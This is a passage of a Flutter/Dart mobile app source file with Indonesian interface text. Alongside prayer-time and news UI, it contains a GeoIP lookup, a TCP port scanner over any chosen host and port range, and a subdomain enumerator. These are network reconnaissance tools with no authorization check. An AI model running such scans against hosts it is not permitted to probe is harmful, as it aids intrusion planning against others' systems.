        keyboardType: isNumber ? TextInputType.number : TextInputType.text,
        style: const TextStyle(color: Colors.white),
        decoration: InputDecoration(
          labelText: label,
          labelStyle: const TextStyle(color: _C.textSub),
          enabledBorder: OutlineInputBorder(
            borderSide: const BorderSide(color: _C.border),
            borderRadius: BorderRadius.circular(10),
          ),
          focusedBorder: OutlineInputBorder(
            borderSide: const BorderSide(color: _C.redMid),
            borderRadius: BorderRadius.circular(10),
          ),
        ),
      ),
    );
  }
}

// ════════════════════════════════════════════════════════════════════════════
// ─── SHEET: SHOLAT TOOLS ──────────────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
class _SholatToolsSheet extends StatefulWidget {
  const _SholatToolsSheet();

  @override
  State<_SholatToolsSheet> createState() => __SholatToolsSheetState();
}

class __SholatToolsSheetState extends State<_SholatToolsSheet> {
  final TextEditingController _kotaCtrl = TextEditingController(text: 'Jakarta');
  Map<String, dynamic>? _jadwal;
  bool _loading = false;
  String _error = '';
  final AudioPlayer _player = AudioPlayer();

  Future<void> _fetchJadwal(String kota) async {
    setState(() { _loading = true; _error = ''; });
    try {
      final url = Uri.parse('https://api.aladhan.com/v1/timingsByCity?city=$kota&country=Indonesia&method=20');
      final res = await http.get(url);
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        setState(() { _jadwal = data['data']['timings']; _loading = false; });
      } else {
        setState(() { _error = 'Gagal fetch'; _loading = false; });
      }
    } catch (_) {
      setState(() { _error = 'Error koneksi'; _loading = false; });
    }
  }

  void _playAdzan() {
    _player.play(AssetSource('sounds/adzan.mp3'));
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      height: MediaQuery.of(context).size.height * 0.7,
      decoration: const BoxDecoration(
        color: _C.bg,
        borderRadius: BorderRadius.vertical(top: Radius.circular(28)),
      ),
      padding: const EdgeInsets.all(16),
      child: Column(
        children: [
          Container(width: 40, height: 4, decoration: BoxDecoration(color: _C.border, borderRadius: BorderRadius.circular(2))),
          const SizedBox(height: 12),
          Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
            const Text('🕌 Jadwal Shalat', style: TextStyle(color: _C.text, fontSize: 18, fontWeight: FontWeight.w700)),
            IconButton(icon: const Icon(Icons.volume_up, color: _C.redMid), onPressed: _playAdzan),
          ]),
          Row(
            children: [
              Expanded(child: TextField(
                controller: _kotaCtrl,
                style: const TextStyle(color: Colors.white),
                decoration: InputDecoration(
                  hintText: 'Kota',
                  hintStyle: const TextStyle(color: _C.textSub),
                  enabledBorder: OutlineInputBorder(
                    borderSide: const BorderSide(color: _C.border),
                    borderRadius: BorderRadius.circular(10),
                  ),
                  focusedBorder: OutlineInputBorder(
                    borderSide: const BorderSide(color: _C.redMid),
                    borderRadius: BorderRadius.circular(10),
                  ),
                ),
              )),
              const SizedBox(width: 8),
              ElevatedButton(
                onPressed: () => _fetchJadwal(_kotaCtrl.text),
                style: ElevatedButton.styleFrom(backgroundColor: _C.redMid),
                child: const Text('Cari', style: TextStyle(color: Colors.black)),
              ),
            ],
          ),
          const SizedBox(height: 12),
          if (_loading) const CircularProgressIndicator(color: _C.redMid),
          if (_error.isNotEmpty) Text(_error, style: const TextStyle(color: Colors.red)),
          if (_jadwal != null) Expanded(
            child: ListView(
              children: [
                _shalatTile('🌅 Subuh', _jadwal!['Fajr']),
                _shalatTile('☀️ Dzuhur', _jadwal!['Dhuhr']),
                _shalatTile('🌇 Ashar', _jadwal!['Asr']),
                _shalatTile('🌆 Maghrib', _jadwal!['Maghrib']),
                _shalatTile('🌙 Isya', _jadwal!['Isha']),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _shalatTile(String name, String time) {
    return Container(
      margin: const EdgeInsets.only(bottom: 8),
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
      decoration: BoxDecoration(
        color: _C.card,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: _C.border),
      ),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Text(name, style: const TextStyle(color: Colors.white, fontSize: 16)),
          Text(time, style: const TextStyle(color: _C.redMid, fontSize: 16)),
        ],
      ),
    );
  }
}

// ════════════════════════════════════════════════════════════════════════════
// ─── SHEET: GEO TOOLS ─────────────────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
class _GeoToolsSheet extends StatefulWidget {
  const _GeoToolsSheet();

  @override
  State<_GeoToolsSheet> createState() => __GeoToolsSheetState();
}

class __GeoToolsSheetState extends State<_GeoToolsSheet> {
  final TextEditingController _ipCtrl = TextEditingController();
  String _result = '';

  Future<void> _lookup() async {
    if (_ipCtrl.text.isEmpty) { setState(() => _result = '❌ IP kosong!'); return; }
    setState(() => _result = '🌍 Mencari...');
    try {
      final res = await http.get(Uri.parse('http://ip-api.com/json/${_ipCtrl.text}'));
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (data['status'] == 'success') {
          setState(() => _result = '''
📍 IP: ${data['query']}
🌐 Negara: ${data['country']} (${data['countryCode']})
🏙️ Kota: ${data['city']}
📡 ISP: ${data['isp']}
🗺️ Koordinat: ${data['lat']}, ${data['lon']}
''');
        } else {
          setState(() => _result = '❌ Gagal: ${data['message']}');
        }
      }
    } catch (_) {
      setState(() => _result = '❌ Error koneksi');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      height: MediaQuery.of(context).size.height * 0.6,
      decoration: const BoxDecoration(
        color: _C.bg,
        borderRadius: BorderRadius.vertical(top: Radius.circular(28)),
      ),
      padding: const EdgeInsets.all(16),
      child: Column(
        children: [
          Container(width: 40, height: 4, decoration: BoxDecoration(color: _C.border, borderRadius: BorderRadius.circular(2))),
          const SizedBox(height: 12),
          const Text('🌍 GeoIP Tracker', style: TextStyle(color: _C.text, fontSize: 18, fontWeight: FontWeight.w700)),
          const SizedBox(height: 12),
          TextField(
            controller: _ipCtrl,
            style: const TextStyle(color: Colors.white),
            decoration: InputDecoration(
              hintText: 'Masukkan IP',
              hintStyle: const TextStyle(color: _C.textSub),
              enabledBorder: OutlineInputBorder(
                borderSide: const BorderSide(color: _C.border),
                borderRadius: BorderRadius.circular(10),
              ),
              focusedBorder: OutlineInputBorder(
                borderSide: const BorderSide(color: _C.redMid),
                borderRadius: BorderRadius.circular(10),
              ),
            ),
          ),
          const SizedBox(height: 12),
          ElevatedButton(
            onPressed: _lookup,
            style: ElevatedButton.styleFrom(backgroundColor: Colors.green.shade700),
            child: const Text('🔍 LACAK'),
          ),
          const SizedBox(height: 12),
          Expanded(
            child: Container(
              width: double.infinity,
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: _C.card,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: _C.border),
              ),
              child: SingleChildScrollView(
                child: Text(_result, style: const TextStyle(color: Colors.white70)),
              ),
            ),
          ),
        ],
      ),
    );
  }
}

// ════════════════════════════════════════════════════════════════════════════
// ─── SHEET: PORT SCANNER ──────────────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
class _PortScannerSheet extends StatefulWidget {
  const _PortScannerSheet();

  @override
  State<_PortScannerSheet> createState() => __PortScannerSheetState();
}

class __PortScannerSheetState extends State<_PortScannerSheet> {
  final TextEditingController _hostCtrl = TextEditingController();
  final TextEditingController _startCtrl = TextEditingController(text: '1');
  final TextEditingController _endCtrl = TextEditingController(text: '1000');
  bool _scanning = false;
  String _result = '';

  Future<void> _scan() async {
    if (_hostCtrl.text.isEmpty) { setState(() => _result = '❌ Host kosong!'); return; }
    final start = int.tryParse(_startCtrl.text) ?? 1;
    final end = int.tryParse(_endCtrl.text) ?? 1000;
    setState(() { _scanning = true; _result = '🔍 Scanning...'; });
    final open = <int>[];
    for (int port = start; port <= end; port++) {
      try {
        final s = await Socket.connect(_hostCtrl.text, port, timeout: const Duration(seconds: 1));
        s.close();
        open.add(port);
      } catch (_) {}
    }
    setState(() {
      _scanning = false;
      _result = '✅ Port terbuka: ${open.isEmpty ? 'tidak ada' : open.join(', ')}';
    });
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      height: MediaQuery.of(context).size.height * 0.6,
      decoration: const BoxDecoration(
        color: _C.bg,
        borderRadius: BorderRadius.vertical(top: Radius.circular(28)),
      ),
      padding: const EdgeInsets.all(16),
      child: Column(
        children: [
          Container(width: 40, height: 4, decoration: BoxDecoration(color: _C.border, borderRadius: BorderRadius.circular(2))),
          const SizedBox(height: 12),
          const Text('📡 Port Scanner', style: TextStyle(color: _C.text, fontSize: 18, fontWeight: FontWeight.w700)),
          const SizedBox(height: 12),
          _inputField('Host', _hostCtrl),
          _inputField('Port Mulai', _startCtrl, isNumber: true),
          _inputField('Port Akhir', _endCtrl, isNumber: true),
          const SizedBox(height: 12),
          ElevatedButton(
            onPressed: _scanning ? null : _scan,
            style: ElevatedButton.styleFrom(backgroundColor: Colors.blue.shade700),
            child: _scanning ? const SizedBox(width: 20, height: 20, child: CircularProgressIndicator(strokeWidth: 2)) : const Text('🔍 SCAN'),
          ),
          const SizedBox(height: 12),
          Expanded(
            child: Container(
              width: double.infinity,
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: _C.card,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: _C.border),
              ),
              child: SingleChildScrollView(
                child: Text(_result, style: const TextStyle(color: Colors.white70)),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _inputField(String label, TextEditingController ctrl, {bool isNumber = false}) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 8),
      child: TextField(
        controller: ctrl,
        keyboardType: isNumber ? TextInputType.number : TextInputType.text,
        style: const TextStyle(color: Colors.white),
        decoration: InputDecoration(
          labelText: label,
          labelStyle: const TextStyle(color: _C.textSub),
          enabledBorder: OutlineInputBorder(
            borderSide: const BorderSide(color: _C.border),
            borderRadius: BorderRadius.circular(10),
          ),
          focusedBorder: OutlineInputBorder(
            borderSide: const BorderSide(color: _C.redMid),
            borderRadius: BorderRadius.circular(10),
          ),
        ),
      ),
    );
  }
}

// ════════════════════════════════════════════════════════════════════════════
// ─── SHEET: SUBDOMAIN FINDER ──────────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
class _SubdomainFinderSheet extends StatefulWidget {
  const _SubdomainFinderSheet();

  @override
  State<_SubdomainFinderSheet> createState() => __SubdomainFinderSheetState();
}

class __SubdomainFinderSheetState extends State<_SubdomainFinderSheet> {
  final TextEditingController _domainCtrl = TextEditingController();
  bool _finding = false;
  String _result = '';

  Future<void> _find() async {
    if (_domainCtrl.text.isEmpty) { setState(() => _result = '❌ Domain kosong!'); return; }
    setState(() { _finding = true; _result = '🔎 Mencari...'; });
    final found = <String>[];
    final common = ['www', 'api', 'mail', 'ftp', 'dev', 'test', 'admin', 'app', 'cdn', 'static', 'blog', 'support'];
    for (var sub in common) {
      try {
        final res = await InternetAddress.lookup('$sub.${_domainCtrl.text}');
        if (res.isNotEmpty) found.add('$sub.${_domainCtrl.text}');
      } catch (_) {}
    }
    setState(() {
      _finding = false;
      _result = '📌 Subdomain ditemukan: ${found.isEmpty ? 'tidak ada' : found.join(', ')}';
    });
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      height: MediaQuery.of(context).size.height * 0.6,
      decoration: const BoxDecoration(
        color: _C.bg,
        borderRadius: BorderRadius.vertical(top: Radius.circular(28)),
      ),
      padding: const EdgeInsets.all(16),
      child: Column(
        children: [
          Container(width: 40, height: 4, decoration: BoxDecoration(color: _C.border, borderRadius: BorderRadius.circular(2))),
          const SizedBox(height: 12),
          const Text('🔎 Subdomain Finder', style: TextStyle(color: _C.text, fontSize: 18, fontWeight: FontWeight.w700)),
          const SizedBox(height: 12),
          TextField(
            controller: _domainCtrl,
            style: const TextStyle(color: Colors.white),
            decoration: InputDecoration(
              hintText: 'contoh: google.com',
              hintStyle: const TextStyle(color: _C.textSub),
              enabledBorder: OutlineInputBorder(
                borderSide: const BorderSide(color: _C.border),
                borderRadius: BorderRadius.circular(10),
              ),
              focusedBorder: OutlineInputBorder(
                borderSide: const BorderSide(color: _C.redMid),
                borderRadius: BorderRadius.circular(10),
              ),
            ),
          ),
          const SizedBox(height: 12),
          ElevatedButton(
            onPressed: _finding ? null : _find,
            style: ElevatedButton.styleFrom(backgroundColor: Colors.purple.shade700),
            child: _finding ? const SizedBox(width: 20, height: 20, child: CircularProgressIndicator(strokeWidth: 2)) : const Text('🔎 FIND'),
          ),
          const SizedBox(height: 12),
          Expanded(
            child: Container(
              width: double.infinity,
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: _C.card,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: _C.border),
              ),
              child: SingleChildScrollView(
                child: Text(_result, style: const TextStyle(color: Colors.white70)),
              ),
            ),
          ),
        ],
      ),
    );
  }
}

// ════════════════════════════════════════════════════════════════════════════
// ─── STATS STRIP ────────────────────────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
class _StatsStrip extends StatelessWidget {
  final int online, connections;
  const _StatsStrip({required this.online, required this.connections});

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 20),
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
        decoration: BoxDecoration(
          color: _C.card,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: _C.border),
        ),
        child: Row(
          children: [
            _StatItem(icon: Icons.people_alt_rounded, label: 'Online', value: '$online', color: _C.green),
            Container(width: 1, height: 32, color: _C.border, margin: const EdgeInsets.symmetric(horizontal: 16)),
            _StatItem(icon: Icons.wifi_rounded, label: 'Koneksi', value: '$connections', color: _C.redLight),
            const Spacer(),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
              decoration: BoxDecoration(
                color: _C.green.withOpacity(0.1),
                borderRadius: BorderRadius.circular(8),
                border: Border.all(color: _C.green.withOpacity(0.3)),
              ),
              child: const Text('LIVE', style: TextStyle(color: _C.green, fontSize: 10, fontWeight: FontWeight.w700, letterSpacing: 0.8)),
            ),
          ],
        ),
      ),
    );
  }
}

class _StatItem extends StatelessWidget {
  final IconData icon; final String label, value; final Color color;
  const _StatItem({required this.icon, required this.label, required this.value, required this.color});

  @override
  Widget build(BuildContext context) {
    return Row(children: [
      Icon(icon, color: color, size: 16),
      const SizedBox(width: 8),
      Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Text(value, style: TextStyle(color: color, fontSize: 15, fontWeight: FontWeight.w800)),
        Text(label, style: const TextStyle(color: _C.textSub, fontSize: 10)),
      ]),
    ]);
  }
}

// ════════════════════════════════════════════════════════════════════════════
// ─── NEWS CARD ──────────────────────────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
class _NewsCard extends StatelessWidget {
  final dynamic item; final bool isActive;
  const _NewsCard({required this.item, required this.isActive});

  @override
  Widget build(BuildContext context) {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 6),
      decoration: BoxDecoration(
        color: _C.card,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: isActive ? _C.borderLit : _C.border, width: isActive ? 1.5 : 1),
        boxShadow: isActive ? [BoxShadow(color: _C.red.withOpacity(0.15), blurRadius: 20, offset: const Offset(0, 8))] : [],
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(20),
        child: Stack(fit: StackFit.expand, children: [
          if (item['image'] != null && item['image'].toString().isNotEmpty)
            NewsMedia(url: item['image']),
          Container(decoration: const BoxDecoration(
            gradient: LinearGradient(colors: [Color(0xE6060B14), Colors.transparent], begin: Alignment.bottomCenter, end: Alignment.topCenter, stops: [0.0, 0.7]),
          )),
          Positioned(
            bottom: 16, left: 16, right: 16,
            child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                decoration: BoxDecoration(
                  color: _C.redMid.withOpacity(0.2),
                  borderRadius: BorderRadius.circular(6),
                  border: Border.all(color: _C.redMid.withOpacity(0.3)),
                ),
                child: const Text('NEWS', style: TextStyle(color: _C.redLight, fontSize: 9, fontWeight: FontWeight.w800, letterSpacing: 1)),
              ),
              const SizedBox(height: 6),
              Text(item['title'] ?? 'No Title', style: const TextStyle(color: _C.text, fontSize: 15, fontWeight: FontWeight.w700, height: 1.3), maxLines: 2, overflow: TextOverflow.ellipsis),
              if (item['desc'] != null && item['desc'].toString().isNotEmpty) ...[
                const SizedBox(height: 4),
                Text(item['desc'], style: const TextStyle(color: _C.textSub, fontSize: 11, height: 1.4), maxLines: 1, overflow: TextOverflow.ellipsis),
              ],
            ]),
          ),
        ]),
      ),
    );
  }
}

// ════════════════════════════════════════════════════════════════════════════
// ─── ACTION CARD ────────────────────────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
class _ActionCard extends StatefulWidget {
  final IconData icon; final Color iconColor, iconBg;
  final String title, subtitle; final Widget? trailing; final VoidCallback onTap;
  const _ActionCard({required this.icon, required this.iconColor, required this.iconBg, required this.title, required this.subtitle, required this.onTap, this.trailing});

  @override
  State<_ActionCard> createState() => _ActionCardState();
}

class _ActionCardState extends State<_ActionCard> {
  bool _pressed = false;

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) => setState(() => _pressed = true),
      onTapUp: (_) { setState(() => _pressed = false); widget.onTap(); },
      onTapCancel: () => setState(() => _pressed = false),
      child: AnimatedScale(
        scale: _pressed ? 0.97 : 1.0,
        duration: const Duration(milliseconds: 130),
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 180),
          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
          decoration: BoxDecoration(
            color: _pressed ? _C.card.withOpacity(0.9) : _C.card,
            borderRadius: BorderRadius.circular(16),
            border: Border.all(color: _pressed ? widget.iconColor.withOpacity(0.3) : _C.border),
            boxShadow: _pressed ? [BoxShadow(color: widget.iconColor.withOpacity(0.12), blurRadius: 16, offset: const Offset(0, 4))] : [],
          ),
          child: Row(children: [
            Container(width: 44, height: 44, decoration: BoxDecoration(color: widget.iconBg, borderRadius: BorderRadius.circular(12), border: Border.all(color: widget.iconColor.withOpacity(0.2))), child: Icon(widget.icon, color: widget.iconColor, size: 20)),
            const SizedBox(width: 14),
            Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Text(widget.title, style: const TextStyle(color: _C.text, fontSize: 14, fontWeight: FontWeight.w700)),
              const SizedBox(height: 2),
              Text(widget.subtitle, style: const TextStyle(color: _C.textSub, fontSize: 11)),
            ])),
            if (widget.trailing != null) ...[const SizedBox(width: 10), widget.trailing!],
          ]),
        ),
      ),
    );
  }
}

// ════════════════════════════════════════════════════════════════════════════
// ─── DRAWER HEADER ──────────────────────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
class _DrawerHeader extends StatefulWidget {
  final String username, role, expiredDate;
  final File? profileImage;
  final VideoPlayerController? videoCtrl;
  const _DrawerHeader({required this.username, required this.role, required this.expiredDate, required this.profileImage, required this.videoCtrl});

  @override
  State<_DrawerHeader> createState() => _DrawerHeaderState();
}

class _DrawerHeaderState extends State<_DrawerHeader> with SingleTickerProviderStateMixin {
  late AnimationController _c;
  late Animation<double> _fade;
  late Animation<Offset> _slide;

  @override
  void initState() {
    super.initState();
    _c = AnimationController(vsync: this, duration: const Duration(milliseconds: 600));
    _fade = CurvedAnimation(parent: _c, curve: Curves.easeOut);
    _slide = Tween<Offset>(begin: const Offset(0, 0.2), end: Offset.zero).animate(CurvedAnimation(parent: _c, curve: Curves.easeOutCubic));
    _c.forward();
  }

  @override
  void dispose() { _c.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    final rColor = _roleColor(widget.role);
    return Container(
      height: 240,
      clipBehavior: Clip.hardEdge,
      decoration: const BoxDecoration(color: _C.card, border: Border(bottom: BorderSide(color: _C.border))),
      child: Stack(
        children: [
          if (widget.videoCtrl != null && widget.videoCtrl!.value.isInitialized)
            Positioned.fill(child: FittedBox(fit: BoxFit.cover, child: SizedBox(width: widget.videoCtrl!.value.size.width, height: widget.videoCtrl!.value.size.height, child: VideoPlayer(widget.videoCtrl!)))),
          Positioned.fill(child: Container(decoration: const BoxDecoration(gradient: LinearGradient(begin: Alignment.topCenter, end: Alignment.bottomCenter, colors: [Color(0x33060B14), Color(0xE6060B14)])))),
          Positioned.fill(
            child: SafeArea(
              child: FadeTransition(
                opacity: _fade,
                child: SlideTransition(
                  position: _slide,
                  child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
                    Stack(children: [
                      Container(width: 78, height: 78, decoration: BoxDecoration(shape: BoxShape.circle, border: Border.all(color: rColor, width: 2.5), boxShadow: [BoxShadow(color: rColor.withOpacity(0.4), blurRadius: 18)]), child: ClipOval(child: widget.profileImage != null ? Image.file(widget.profileImage!, fit: BoxFit.cover) : Container(color: _C.surface, child: Icon(_roleIcon(widget.role), size: 36, color: rColor.withOpacity(0.9))))),
                      Positioned(right: 0, bottom: 0, child: Container(padding: const EdgeInsets.all(4), decoration: BoxDecoration(color: rColor, shape: BoxShape.circle, border: Border.all(color: _C.card, width: 2)), child: Icon(_roleIcon(widget.role), size: 10, color: Colors.white))),
                    ]),
                    const SizedBox(height: 12),
                    Text(widget.username, style: const TextStyle(color: _C.text, fontSize: 18, fontWeight: FontWeight.w800)),
                    const SizedBox(height: 4),
                    Container(padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4), decoration: BoxDecoration(color: rColor.withOpacity(0.12), borderRadius: BorderRadius.circular(20), border: Border.all(color: rColor.withOpacity(0.3))), child: Text(widget.role.toUpperCase(), style: TextStyle(color: rColor, fontSize: 11, fontWeight: FontWeight.w700, letterSpacing: 1))),
                    const SizedBox(height: 6),
                    Text('Exp: ${widget.expiredDate}', style: const TextStyle(color: _C.textSub, fontSize: 11)),
                  ]),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }
}

// ════════════════════════════════════════════════════════════════════════════
// ─── DRAWER ITEM ────────────────────────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
class _DrawerItem extends StatefulWidget {
  final IconData icon; final String label; final VoidCallback onTap; final bool isDestructive;
  const _DrawerItem({required this.icon, required this.label, required this.onTap, this.isDestructive = false});

  @override
  State<_DrawerItem> createState() => _DrawerItemState();
}

class _DrawerItemState extends State<_DrawerItem> {
  bool _pressed = false;

  @override
  Widget build(BuildContext context) {
    final color = widget.isDestructive ? _C.red : _C.textSub;
    return GestureDetector(
      onTapDown: (_) => setState(() => _pressed = true),
      onTapUp: (_) { setState(() => _pressed = false); widget.onTap(); },
      onTapCancel: () => setState(() => _pressed = false),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 140),
        margin: const EdgeInsets.only(bottom: 8),
        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 13),
        decoration: BoxDecoration(
          color: _pressed ? color.withOpacity(0.1) : Colors.transparent,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: _pressed ? color.withOpacity(0.25) : _C.border),
        ),
        child: Row(children: [
          Icon(widget.icon, color: color, size: 18),
          const SizedBox(width: 14),
          Text(widget.label, style: TextStyle(color: widget.isDestructive ? _C.red : _C.text, fontSize: 14, fontWeight: FontWeight.w600)),
          const Spacer(),
          Icon(Icons.arrow_forward_ios_rounded, color: _C.textDim, size: 12),
        ]),
      ),
    );
  }
}

// ════════════════════════════════════════════════════════════════════════════
// ─── BOTTOM NAV BUTTON ─────────────────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
class _NavButton extends StatelessWidget {
  final IconData icon; final String label; final bool active; final VoidCallback onTap;
  const _NavButton({required this.icon, required this.label, required this.active, required this.onTap});

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTap: onTap,
      behavior: HitTestBehavior.opaque,
      child: Column(mainAxisSize: MainAxisSize.min, children: [
        AnimatedContainer(
          duration: const Duration(milliseconds: 220),
          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 7),
          decoration: BoxDecoration(color: active ? _C.redMid.withOpacity(0.15) : Colors.transparent, borderRadius: BorderRadius.circular(12)),
          child: Icon(icon, size: 22, color: active ? _C.redLight : _C.textDim),
        ),
        const SizedBox(height: 2),
        AnimatedDefaultTextStyle(
          duration: const Duration(milliseconds: 200),
          style: TextStyle(color: active ? _C.redLight : _C.textDim, fontSize: 10, fontWeight: active ? FontWeight.w700 : FontWeight.w400),
          child: Text(label),
        ),
      ]),
    );
  }
}

// ════════════════════════════════════════════════════════════════════════════
// ─── APP BAR ICON BUTTON ──────────────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
class _AppBarIconBtn extends StatefulWidget {
  final IconData icon; final VoidCallback onTap;
  const _AppBarIconBtn({required this.icon, required this.onTap});

  @override
  State<_AppBarIconBtn> createState() => _AppBarIconBtnState();
}

class _AppBarIconBtnState extends State<_AppBarIconBtn> {
  bool _down = false;

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 4, vertical: 8),
      child: GestureDetector(
        onTapDown: (_) => setState(() => _down = true),
        onTapUp: (_) { setState(() => _down = false); widget.onTap(); },
        onTapCancel: () => setState(() => _down = false),
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 120),
          width: 36, height: 36,
          decoration: BoxDecoration(color: _down ? _C.border : _C.surface, borderRadius: BorderRadius.circular(10), border: Border.all(color: _C.border)),
          child: Icon(widget.icon, color: _C.textSub, size: 18),
        ),
      ),
    );
  }
}

// ════════════════════════════════════════════════════════════════════════════
// ─── MENU BUTTON ───────────────────────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
class _MenuBtn extends StatefulWidget {
  final VoidCallback onTap;
  const _MenuBtn({required this.onTap});

  @override
  State<_MenuBtn> createState() => _MenuBtnState();
}

class _MenuBtnState extends State<_MenuBtn> {
  bool _down = false;

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.all(10),
      child: GestureDetector(
        onTapDown: (_) => setState(() => _down = true),
        onTapUp: (_) { setState(() => _down = false); widget.onTap(); },
        onTapCancel: () => setState(() => _down = false),
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 120),
          decoration: BoxDecoration(color: _down ? _C.border : _C.surface, borderRadius: BorderRadius.circular(10), border: Border.all(color: _C.border)),
          child: const Icon(Icons.menu_rounded, color: _C.textSub, size: 20),
        ),
      ),
    );
  }
}

// ════════════════════════════════════════════════════════════════════════════
// ─── ANIMATED BACKGROUND ──────────────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
class _AnimatedBg extends StatelessWidget {
  final AnimationController controller;
  const _AnimatedBg({required this.controller});

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: controller,
      builder: (_, __) => CustomPaint(painter: _BgPainter(controller.value)),
    );
  }
}

class _BgPainter extends CustomPainter {
  final double t;
  _BgPainter(this.t);

  @override
  void paint(Canvas canvas, Size size) {
    final grid = Paint()..color = _C.border.withOpacity(0.25)..strokeWidth = 0.5;
    const step = 38.0;
    for (double x = 0; x < size.width; x += step) canvas.drawLine(Offset(x, 0), Offset(x, size.height), grid);
    for (double y = 0; y < size.height; y += step) canvas.drawLine(Offset(0, y), Offset(size.width, y), grid);

    final glow = Paint()..shader = RadialGradient(colors: [_C.red.withOpacity(0.10 + math.sin(t * math.pi * 2) * 0.03), Colors.transparent], radius: 0.9).createShader(Rect.fromCircle(center: Offset(size.width / 2, 0), radius: size.width));
    canvas.drawCircle(Offset(size.width / 2, 0), size.width, glow);
  }

  @override
  bool shouldRepaint(_BgPainter old) => old.t != t;
}

// ════════════════════════════════════════════════════════════════════════════
// ─── SHARED PRIMITIVES ─────────────────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
class _NavItem {
  final IconData icon; final String label;
  const _NavItem({required this.icon, required this.label});
}

PageRoute _slideRoute(Widget page) => PageRouteBuilder(
  pageBuilder: (_, __, ___) => page,
  transitionDuration: const Duration(milliseconds: 350),
  transitionsBuilder: (_, anim, __, child) => SlideTransition(
    position: Tween<Offset>(begin: const Offset(1, 0), end: Offset.zero).animate(CurvedAnimation(parent: anim, curve: Curves.easeOutCubic)),
    child: FadeTransition(opacity: anim, child: child),
  ),
);

class _GradBtn extends StatefulWidget {
  final String label; final VoidCallback onTap; final bool fullWidth; final LinearGradient gradient;
  const _GradBtn({required this.label, required this.onTap, this.fullWidth = false, this.gradient = _C.btnGrad});

  @override
  State<_GradBtn> createState() => _GradBtnState();
}

class _GradBtnState extends State<_GradBtn> {
  bool _down = false;

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) => setState(() => _down = true),
      onTapUp: (_) { setState(() => _down = false); widget.onTap(); },
      onTapCancel: () => setState(() => _down = false),
      child: AnimatedScale(
        scale: _down ? 0.96 : 1.0,
        duration: const Duration(milliseconds: 120),
        child: Container(
          height: 46,
          width: widget.fullWidth ? double.infinity : null,
          padding: widget.fullWidth ? EdgeInsets.zero : const EdgeInsets.symmetric(horizontal: 28),
          decoration: BoxDecoration(gradient: widget.gradient, borderRadius: BorderRadius.circular(13), boxShadow: _down ? [] : [BoxShadow(color: _C.redMid.withOpacity(0.3), blurRadius: 14, offset: const Offset(0, 4))]),
          child: Center(child: Text(widget.label, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w700, fontSize: 14))),
        ),
      ),
    );
  }
}

// ════════════════════════════════════════════════════════════════════════════
// ─── NEWS MEDIA ─────────────────────────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
class NewsMedia extends StatefulWidget {
  final String url;
  const NewsMedia({super.key, required this.url});

  @override
  State<NewsMedia> createState() => _NewsMediaState();
}

class _NewsMediaState extends State<NewsMedia> {
  VideoPlayerController? _ctrl;

  @override
  void initState() {
